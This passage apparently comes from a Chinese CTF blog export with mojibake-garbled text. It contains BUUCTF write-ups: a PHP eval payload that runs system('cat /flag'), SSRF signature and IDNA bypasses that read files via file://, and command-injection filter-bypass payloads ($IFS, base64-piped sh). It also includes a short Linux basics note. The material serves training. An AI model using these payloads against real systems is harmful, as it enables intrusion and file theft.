<p>ä¸­æ‹¬å·è¢«ç¦ç”¨æˆ‘ä»¬å¯ä»¥ç”¨èŠ±æ‹¬å·ä»£æ›¿{}ï¼Œè¦æ„é€ çš„å­—ç¬¦ä¸²ä¸º _GET,phpä¸­æœ‰å°†16è¿›åˆ¶è½¬æˆå­—ç¬¦ä¸²çš„å‡½æ•°hex2binï¼Œé‚£ä¹ˆhex2binåˆæ€ä¹ˆç”Ÿæˆå‘¢ï¼Œè¿™æ—¶å°±éœ€è¦æˆ‘ä»¬çš„base_convertå‡½æ•°äº†ï¼Œ36è¿›åˆ¶ä¹Ÿå°±æ˜¯base36ä¸­æœ‰å­—æ¯æ•°å­—æ­£å¥½å¯ä»¥æ»¡è¶³ã€‚<br>æ‰€ä»¥ base_convert(37907361743,10,36)=hex2binã€‚å› ä¸ºæˆ‘ä»¬æ˜¯è¦å¾—åˆ°_GETæ‰€ä»¥å°±å¾—ç”¨åˆ°å¦å¤–ä¸€ä¸ªå‡½æ•°dechexå°†_GETçš„10è¿›åˆ¶è½¬ä¸º16è¿›åˆ¶å†é€šè¿‡hex2binè½¬æ¢ä¸ºå­—ç¬¦ä¸²<br>æ‰€ä»¥_GET=base_convert(37907361743,10,36)(dechex(1598506324));<br>å¥½äº†æˆ‘ä»¬å·²ç»å¯ä»¥æ„é€ å‡º$_GET[]äº†ï¼Œé‚£ä¹ˆç›´æ¥å°†ä¸Šé¢çš„payloadä¿®æ”¹ä¸‹å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;pi&#125;($$pi&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>[(45æ¡æ¶ˆæ¯) <a href="https://blog.csdn.net/weixin_45577185/article/details/120208258">CISCN 2019 åˆèµ›]Love Math 1_æ»¡æœˆ*çš„åšå®¢-CSDNåšå®¢</a></p>
<h1 id="De1CTF-2019-SSRF-Me1"><a href="#De1CTF-2019-SSRF-Me1" class="headerlink" title="[De1CTF 2019]SSRF Me1"></a>[De1CTF 2019]SSRF Me1</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span>  <span class="comment"># pythonå¾—æ„é€ æ–¹æ³•</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">not</span> os.path.exists(self.sandbox)):  <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span>  <span class="comment"># å®šä¹‰çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œæ­¤å¤„è°ƒç”¨äº†scanè¿™ä¸ªè‡ªå®šä¹‰çš„å‡½æ•°</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="comment"># md5(secert_key + self.action + self.param).hexdigest() == self.sign</span></span><br><span class="line">            <span class="comment"># md5(secert_key + self.action + self.param).hexdigest() == hashlib.md5(secert_key + param + &quot;scan&quot;).hexdigest()</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:  <span class="comment"># actionè¦å†™scan</span></span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)  <span class="comment"># æ­¤å¤„æ˜¯æ–‡ä»¶è¯»å–å¾—æ³¨å…¥ç‚¹</span></span><br><span class="line">                <span class="comment"># resp = urllib.urlopen(param).read()</span></span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp  <span class="comment"># è¾“å‡ºç»“æœ</span></span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:  <span class="comment"># actionè¦åŠ read</span></span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):  <span class="comment"># !!!æ ¡éªŒ</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="comment"># md5(secert_key + param + action).hexdigest()</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span><span class="comment"># !!!è¿™ä¸ªè·¯ç”±ç”¨äºæµ‹è¯•</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="comment"># hashlib.md5(secert_key + param + action).hexdigest()</span></span><br><span class="line"><span class="comment"># hashlib.md5(secert_key + param + &quot;scan&quot;).hexdigest()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span><span class="comment"># è¿™ä¸ªè·¯ç”±æ˜¯æˆ‘èŒå¾—æœ€ç»ˆæ³¨å…¥ç‚¹</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> (waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)  </span><span class="comment"># æ ¹ç›®å½•è·¯ç”±ï¼Œå°±æ˜¯æ˜¾ç¤ºæºä»£ç å¾—åœ°æ–¹</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span>  <span class="comment"># è¿™æ˜¯ç”¨æ¥æ‰«ç›®å½•å¾—å‡½æ•°</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span>  <span class="comment"># !!!è¿™ä¸ªåº”è¯¥æ˜¯æœ¬é¢˜å…³é”®ç‚¹,æ­¤å¤„æ³¨æ„é¡ºåºå…ˆæ˜¯paramåæ˜¯action</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span>  <span class="comment"># è¿™ä¸ªwafæ¯”è¾ƒæ²¡ç”¨å¥½åƒ</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¦æƒ³è·å¾—flag,éœ€è¦æ‰¾åˆ°action,param,signçš„å‚æ•°å€¼</p>
<p><strong>getSign(self.action, self.param) == self.sign</strong>  å¯ä»¥è·å¾—signçš„å€¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span><span class="comment"># !!!è¿™ä¸ªè·¯ç”±ç”¨äºæµ‹è¯•</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="comment"># hashlib.md5(secert_key + param + action).hexdigest()</span></span><br><span class="line"><span class="comment"># hashlib.md5(secert_key + param + &quot;scan&quot;).hexdigest()</span></span><br></pre></td></tr></table></figure>

<p>é€šè¿‡è¿™ä¸ªè·¯å¾„å¯ä»¥è·å¾—signï¼Œhashlib.md5(secert_key + param + action).hexdigest()ï¼Œä¼ å…¥çš„å‚æ•°ä¸€æ ·å³å¯ã€‚è¿™é‡Œå¯¹action è¿›è¡Œäº†èµ‹å€¼ï¼Œä¼ å…¥paramè¦è¿›è¡Œè¿‡æ»¤ï¼Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br></pre></td></tr></table></figure>

<p>å†æŸ¥çœ‹Execï¼Œè·å¾—ä¼ å…¥çš„action å’Œparamçš„å€¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"># hashlib.md5(secert_key + param + &quot;scan&quot;).hexdigest()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸¤æ¬¡æäº¤çš„å€¼è¦ç›¸ç­‰</p>
<p>å‚è€ƒæ–‡ç« ï¼š[(47æ¡æ¶ˆæ¯) BUUCTF <a href="https://blog.csdn.net/weixin_45642610/article/details/114322141">De1CTF 2019]SSRF Me 1_wowå°åçš„åšå®¢-CSDNåšå®¢</a></p>
<h1 id="SUCTF-2019-Pythonginx1"><a href="#SUCTF-2019-Pythonginx1" class="headerlink" title="[SUCTF 2019]Pythonginx1"></a>[SUCTF 2019]Pythonginx1</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>():</span> </span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>) </span><br><span class="line">    host = parse.urlparse(url).hostname </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æˆ‘æ‰Œ your problem? 111&quot;</span> </span><br><span class="line">    </span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url)) </span><br><span class="line">    host = parts[<span class="number">1</span>] </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æˆ‘æ‰Œ your problem? 222 &quot;</span> + host newhost = [] </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>): newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment">#æ¼æ´æ‰€åœ¨å¤„</span></span><br><span class="line">        parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost) </span><br><span class="line">        <span class="comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼ finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0] host = parse.urlparse(finalUrl).hostname </span></span><br><span class="line">        <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: </span><br><span class="line">            <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read() <span class="comment">#é€šè¿‡è¿™ä¸ªéªŒè¯ï¼Œå³å¯è¿›è¡Œè¯»å–</span></span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;æˆ‘æ‰Œ your problem? 333&quot;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨/getUrlè¿™ä¸ªè·¯å¾„ä¸‹ï¼Œç”¨getçš„æ–¹å¼ä¼ å…¥urlè¿™ä¸ªå‚æ•°ï¼Œh.encode(â€˜idnaâ€™).decode(â€˜utf-8â€™)å­˜åœ¨æ¼æ´</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Demo:</span><br><span class="line">â„†è¿™ä¸ªå­—ç¬¦,å¦‚æœä½¿ç”¨python3è¿›è¡Œidnaç¼–ç çš„è¯</span><br><span class="line">print(â€˜â„†â€™.encode(â€˜idnaâ€™))</span><br><span class="line">ç»“æœ</span><br><span class="line">bâ€™c/uâ€™</span><br><span class="line">å¦‚æœå†ä½¿ç”¨utf-8è¿›è¡Œè§£ç çš„è¯</span><br><span class="line">print(bâ€™c/uâ€™.decode(â€˜utf-8â€™))</span><br><span class="line">ç»“æœ</span><br><span class="line">c/u</span><br><span class="line">é€šè¿‡è¿™ç§æ–¹æ³•å¯ä»¥ç»•è¿‡ç½‘ç«™çš„ä¸€äº›è¿‡æ»¤å­—ç¬¦</span><br></pre></td></tr></table></figure>

<h2 id="nginxé‡è¦æ–‡ä»¶çš„ä½ç½®"><a href="#nginxé‡è¦æ–‡ä»¶çš„ä½ç½®" class="headerlink" title="nginxé‡è¦æ–‡ä»¶çš„ä½ç½®"></a><a href="https://so.csdn.net/so/search?q=nginx&spm=1001.2101.3001.7020">nginx</a>é‡è¦æ–‡ä»¶çš„ä½ç½®</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginx</span><br><span class="line">ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf</span><br><span class="line">ç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service</span><br><span class="line">æ¨¡å—ï¼š/usr/lisb64/nginx/modules</span><br><span class="line">åº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx</span><br><span class="line">ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html</span><br><span class="line">æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx</span><br><span class="line">é…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š/usr/local/nginx/conf/nginx.conf</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¯»å–æ–‡ä»¶ï¼Œç›´æ¥è¿›è¡Œè¯»å–æ²¡æœ‰è¯»å‡ºæ¥ï¼Œç„¶ååˆ©ç”¨file://åè®®è¿›è¡Œè¯»å–ï¼Œè¯»äº†å‡ºæ¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=file://suctf.câ„†sr/local/nginx/conf/nginx.conf</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>buuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>linux caozuo</title>
    <url>/2022/01/14/linux-caozuo/</url>
    <content><![CDATA[<h1 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h1><h2 id="æŸ¥æ‰¾ç›®å½•-ls"><a href="#æŸ¥æ‰¾ç›®å½•-ls" class="headerlink" title="æŸ¥æ‰¾ç›®å½• ls"></a>æŸ¥æ‰¾ç›®å½• ls</h2><p>.éšè—æ–‡ä»¶</p>
<p>.å½“å‰æ–‡ä»¶å¤¹ </p>
<p>..ä¸Šçº§ç›®å½•</p>
<p>-a  å…¨éƒ¨æ–‡ä»¶   -l æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯  </p>
<p>ls -lh  æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯</p>
<p><strong>é€šé…ç¬¦</strong></p>
<p>*å¯ä»¥ä»£æ›¿ä»»æ„ä¸ªæ•°çš„å­—ç¬¦  æ¨¡ç³ŠæŸ¥æ‰¾   ï¼Ÿåªèƒ½ä»£æ›¿ä¸€ä¸ª</p>
<p>[1234]23.txt   [1-4]23.txt</p>
<h2 id="åˆ‡æ¢ç›®å½•-cd"><a href="#åˆ‡æ¢ç›®å½•-cd" class="headerlink" title="åˆ‡æ¢ç›®å½•   cd"></a>åˆ‡æ¢ç›®å½•   cd</h2><p>cd   cd ~   åˆ‡æ¢åˆ°å½“å‰ç›®å½•çš„ä¸»ç›®å½•</p>
<p>cd .. åˆ‡æ¢åˆ°ä¸Šçº§ç›®å½•  </p>
<p>cd - åœ¨æœ€è¿‘ä½¿ç”¨çš„ä¸¤ä¸ªä¹‹é—´æ¥å›åˆ‡æ¢ç›®å½•</p>
<h2 id="åˆ›å»ºå’Œåˆ é™¤æ“ä½œ"><a href="#åˆ›å»ºå’Œåˆ é™¤æ“ä½œ" class="headerlink" title="åˆ›å»ºå’Œåˆ é™¤æ“ä½œ"></a>åˆ›å»ºå’Œåˆ é™¤æ“ä½œ</h2><p>touch æ–‡ä»¶å</p>
<p>mkdir åˆ›å»ºæ–°ç›®å½•   -p   é€’å½’åˆ›å»º</p>
<p>rm  åˆ é™¤   ä¸èƒ½æ¢å¤</p>
<h2 id="æ‹·è´å’Œç§»åŠ¨æ–‡ä»¶"><a href="#æ‹·è´å’Œç§»åŠ¨æ–‡ä»¶" class="headerlink" title="æ‹·è´å’Œç§»åŠ¨æ–‡ä»¶"></a>æ‹·è´å’Œç§»åŠ¨æ–‡ä»¶</h2><p>tree ä»¥æ ‘çŠ¶å›¾åˆ—å‡ºæ–‡ä»¶ç›®å½•ç»“æ„   -d åªæ˜¾ç¤ºç›®å½•</p>
<p><strong>cp</strong>  æºæ–‡ä»¶ ç›®æ ‡æ–‡ä»¶  cd ~/dss/ef.txt . </p>
<p>-i è¦†ç›–æ–‡ä»¶å‰çš„æç¤º</p>
<p>-r å¤åˆ¶ç›®å½•</p>
<p>mv è¦ç§»åŠ¨æ–‡ä»¶çš„æº æ–‡ä»¶  ç›®æ ‡æ–‡ä»¶</p>
<p>grep æŸ¥æ‰¾</p>
<h1 id="è¿œç¨‹ç®¡ç†å‘½ä»¤"><a href="#è¿œç¨‹ç®¡ç†å‘½ä»¤" class="headerlink" title="è¿œç¨‹ç®¡ç†å‘½ä»¤"></a>è¿œç¨‹ç®¡ç†å‘½ä»¤</h1><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>ssh -p ç«¯å£å· user@remote </p>
<p>exit é€€å‡ºå½“å‰ç”¨æˆ·ç™»å½•</p>
<p><img src="linux-caozuo.assets/image-20220114222034525.png" alt="image-20220114222034525"></p>
]]></content>
      <categories>
        <category>linux caozuo</category>
      </categories>
      <tags>
        <tag>linux caozuo</tag>
      </tags>
  </entry>
  <entry>
    <title>ping</title>
    <url>/2022/01/05/ping/</url>
    <content><![CDATA[<h1 id="GXYCTF2019-Ping-Ping-Ping-å‘½ä»¤æ³¨å…¥"><a href="#GXYCTF2019-Ping-Ping-Ping-å‘½ä»¤æ³¨å…¥" class="headerlink" title="[[GXYCTF2019]Ping Ping Ping]å‘½ä»¤æ³¨å…¥"></a>[[GXYCTF2019]Ping Ping Ping]å‘½ä»¤æ³¨å…¥</h1><p>1.ç®¡é“ç¬¦</p>
<p>ï¼› |  &amp;  å¸¸ç”¨</p>
<p>2.ç»•è¿‡</p>
<p>ç»•è¿‡ç©ºæ ¼</p>
<p>$IFS$9  &lt;,&lt;&gt;,%20(space),%09(tab),$IFS$9, I F S , {IFS},IFS,IFS</p>
<p>3.è¿‡æ»¤å•è¯</p>
<p>å˜é‡æ›¿æ¢ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php </span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤bashç”¨shæ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh  </span><br><span class="line">//Y2F0IGZsYWcucGhw -&gt;cat flag.php,è¾“å‡ºç»™base64è¿˜åŸç„¶åshæ‰§è¡Œ</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å†…è”æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br><span class="line">//å†…è”ï¼Œå°±æ˜¯å°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>4.å…³é”®å­—è¿‡æ»¤</p>
<h5 id="æ–¹æ³•ä¸€ï¼šç‰¹æ®Šå˜é‡"><a href="#æ–¹æ³•ä¸€ï¼šç‰¹æ®Šå˜é‡" class="headerlink" title="æ–¹æ³•ä¸€ï¼šç‰¹æ®Šå˜é‡"></a>æ–¹æ³•ä¸€ï¼šç‰¹æ®Šå˜é‡</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$*</span><br><span class="line">$@</span><br><span class="line">$x    (x ä»£è¡¨ 1-9)</span><br><span class="line">$&#123;x&#125;   (x&gt;=10)</span><br><span class="line">åœ¨æ²¡æœ‰ä¼ å‚çš„æƒ…å†µä¸‹ï¼Œä¸Šé¢çš„ç‰¹æ®Šå˜é‡éƒ½æ˜¯ä¸ºç©ºçš„ ca$&#123;21&#125;t a.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="æ–¹æ³•äºŒï¼šåæ–œæ "><a href="#æ–¹æ³•äºŒï¼šåæ–œæ " class="headerlink" title="æ–¹æ³•äºŒï¼šåæ–œæ "></a>æ–¹æ³•äºŒï¼šåæ–œæ </h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ca\t a.txt</span><br></pre></td></tr></table></figure>

<h5 id="æ–¹æ³•ä¸‰ï¼šå˜é‡æ›¿æ¢"><a href="#æ–¹æ³•ä¸‰ï¼šå˜é‡æ›¿æ¢" class="headerlink" title="æ–¹æ³•ä¸‰ï¼šå˜é‡æ›¿æ¢"></a>æ–¹æ³•ä¸‰ï¼šå˜é‡æ›¿æ¢</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=ca;b=t;c=a.txt;aaab $c</span><br></pre></td></tr></table></figure>

<h5 id="æ–¹æ³•å››ï¼šå¼•å·"><a href="#æ–¹æ³•å››ï¼šå¼•å·" class="headerlink" title="æ–¹æ³•å››ï¼šå¼•å·"></a>æ–¹æ³•å››ï¼šå¼•å·</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&#x27;a&#x27;t flag.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.&amp;</span><br><span class="line">&amp; è¡¨ç¤ºå°†ä»»åŠ¡ç½®äºåå°æ‰§è¡Œ</span><br><span class="line">2.&amp;&amp;</span><br><span class="line">åªæœ‰åœ¨ &amp;&amp; å·¦è¾¹çš„å‘½ä»¤è¿”å›çœŸï¼ˆå‘½ä»¤è¿”å›å€¼ $? == 0ï¼‰ï¼Œ&amp;&amp; å³è¾¹çš„å‘½ä»¤æ‰ ä¼šè¢«æ‰§è¡Œã€‚</span><br><span class="line">3.|</span><br><span class="line">| è¡¨ç¤ºç®¡é“ï¼Œä¸Šä¸€æ¡å‘½ä»¤çš„è¾“å‡ºï¼Œä½œä¸ºä¸‹ä¸€æ¡å‘½ä»¤çš„å‚æ•°</span><br><span class="line">4.||</span><br><span class="line">åªæœ‰åœ¨ || å·¦è¾¹çš„å‘½ä»¤è¿”å›å‡ï¼ˆå‘½ä»¤è¿”å›å€¼ $? == 1ï¼‰ï¼Œ|| å³è¾¹çš„å‘½ä»¤æ‰ ä¼šè¢«æ‰§è¡Œã€‚</span><br><span class="line">5.ï¼›</span><br><span class="line">å¤šè¡Œè¯­å¥ç”¨æ¢è¡ŒåŒºåˆ†ä»£ç å¿«ï¼Œå•è¡Œè¯­å¥ä¸€èˆ¬è¦ç”¨åˆ°åˆ†å·æ¥åŒºåˆ†ä»£ç å—</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ›´å¤šè¯¦æƒ…ï¼ŒæŸ¥çœ‹ä»¥ä¸‹æ–‡ç« </p>
<p>å‚è€ƒæ–‡ç« ï¼š[<a href="https://www.cnblogs.com/HelloCTF/p/13051220.html">GXYCTF2019]Ping Ping Ping(pingå‘½ä»¤æ‰§è¡Œç»•è¿‡Waf) - Hel10 - åšå®¢å›­ (cnblogs.com)</a></p>
